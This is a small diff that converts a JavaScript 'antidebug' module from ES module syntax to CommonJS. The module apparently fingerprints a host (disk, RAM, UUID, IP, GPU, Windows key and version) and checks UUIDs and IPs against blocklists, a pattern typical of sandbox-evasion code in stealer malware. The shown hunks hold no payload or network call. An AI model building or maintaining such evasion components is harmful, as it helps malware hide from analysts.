@@ -1,7 +1,7 @@
-import util from "util";
-import process from "process";
-import child_process from "child_process";
-import axios from "axios";
+const util = require("util");
+const process = require("process");
+const child_process = require("child_process");
+const axios = require("axios");
 
 const exec = util.promisify(child_process.exec);
 
@@ -58,7 +58,7 @@ const uuid_blocked = async (value) => await check_blocked("uuids", value);
 
 const ip_blocked = async (value) => await check_blocked("ips", value);
 
-export const antidebug = async (res, disk, ram, uid, cpu_count, ip, os, cpu, gpu, win_key, win_ver) => {
+const antidebug = async (res, disk, ram, uid, cpu_count, ip, os, cpu, gpu, win_key, win_ver) => {
   if (res !== true) return;
   try {
     const [
@@ -109,3 +109,7 @@ export const antidebug = async (res, disk, ram, uid, cpu_count, ip, os, cpu, gpu
     console.error(error);
   }
 };
+
+module.exports = {
+  antidebug
+}
